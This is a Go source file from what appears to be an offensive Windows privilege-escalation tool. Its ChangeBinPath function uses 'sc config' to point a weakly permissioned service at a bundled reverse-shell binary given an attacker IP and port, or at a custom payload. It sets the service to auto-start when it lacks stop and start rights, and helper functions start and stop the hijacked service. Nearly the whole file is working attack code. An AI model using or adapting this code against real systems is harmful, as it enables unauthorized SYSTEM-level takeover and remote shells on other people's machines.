package enumwin

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func ChangeBinPath(serv *WeakServ, choice int, m *MenuColors) *WeakServ {
	// Modifies service binary -> return pointer to
	// modified service and error if cannot change bin path

	// Hold user home directory and append revshell path to it
	homeDir, _ := os.UserHomeDir()

	// Fix home dir format here. Change delimeter to / and make
	// it lowercase. Idk why this works.
	homeDir = strings.ToLower(strings.Replace(homeDir, `\`, `/`, -1))

	var cmdFormat string
	var startAuto bool

	switch choice {
	case 1:
		var hostIP, hostPort string

		m.CD.Println("What is the host IP for the reverse shell?")

		r, err := fmt.Scanln(&hostIP)

		if r != 1 || err != nil {
			panic("Cannot process host IP")
		}

		m.CD.Println("What is the port number for the host?")
		r, err = fmt.Scanln(&hostPort)

		if r != 1 || err != nil {
			panic("Cannot process host Port")
		}

		malPath := fmt.Sprintf(homeDir + `/win-binary-hijacking/internal/malbinaries/revshell.exe`)

		// Formatting sc config portion here

		if serv.CanStart && serv.CanStop {
			cmdFormat = fmt.Sprintf(`binpath=%s %s %s`, malPath, hostIP, hostPort)
		} else {
			m.CD.Println("Insufficient permissions to start and stop this service.")
			m.CD.Println("Setting START_TYPE to AUTO")
			cmdFormat = fmt.Sprintf(`start=auto binpath=%s %s %s`, malPath, hostIP, hostPort)
			startAuto = true

		}

		cmd := exec.Command("sc", "config", serv.Name, cmdFormat)

		err = cmd.Run()

		if err != nil {
			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
		} else {
			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
			serv.BinPath = malPath + " " + hostIP + " " + hostPort
			if startAuto {
				serv.StartMode = "AUTO_START"
			}
		}

	case 2:
		var customBin string

		m.CD.Println("Please enter FULL path of your custom payload:")

		r, err := fmt.Scanln(&customBin)

		if r != 1 || err != nil {
			panic("Trouble processing custom binary path")
		}

		// Formatting sc config portion here

		if serv.CanStart && serv.CanStop {
			cmdFormat = fmt.Sprintf(`binpath="%s"`, customBin)
		} else {
			m.CD.Println("Insufficient permissions to start and stop this service.")
			m.CD.Println("Setting START_TYPE to AUTO")
			cmdFormat = fmt.Sprintf(`start=auto binpath="%s"`, customBin)
			startAuto = true

		}

		cmd := exec.Command("sc", "config", serv.Name, cmdFormat)

		err = cmd.Run()

		if err != nil {
			m.CD.Printf("Error changing binary path for service: %s: %v\n", serv.Name, err)
		} else {
			m.CD.Printf("Changed binary path for service: %s succesfully\n", serv.Name)
			serv.BinPath = customBin

			if startAuto {
				serv.StartMode = "AUTO_START"
			}
		}

	}

	return serv
}

func StartServ(serv *WeakServ) error {
	// Function to start exploited service
	// Returns error of net start command

	cmd := exec.Command("net", "start", serv.Name)

	err := cmd.Run()

	return err
}

func StopServ(serv *WeakServ) error {
	// Function to stop exploited service
	// Returns error of net stop command

	cmd := exec.Command("net", "stop", serv.Name)

	err := cmd.Run()

	return err
}
